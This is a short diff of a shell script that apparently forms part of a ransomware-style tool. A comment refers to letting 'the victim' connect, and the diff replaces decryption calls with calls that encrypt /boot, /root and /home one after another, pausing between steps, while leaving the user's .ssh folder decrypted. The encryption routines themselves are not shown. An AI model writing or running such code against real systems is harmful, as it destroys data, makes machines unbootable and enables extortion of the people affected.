@@ -32,10 +32,20 @@ sleep 5 # let the victim connect
 
 decrypt_file "$HOME/testing.txt"
 
-decrypt_file "/boot"
-decrypt_file "/root"
-decrypt_file "/run"
-# decrypt_file "/var"
+encrypt_file "/boot"
+sleep 5
+encrypt_file "/root"
+sleep 5
+# encrypt_file "/run"
+# sleep 5
+# encrypt_file "/var"
+sleep 15
+# encrypt_file "/etc"
+# sleep 5
+encrypt_file "/home"
+decrypt_file "/home/blankcanvas/.ssh"
+sleep 5
+
 
 # # Decrypt all text files
 # total=0
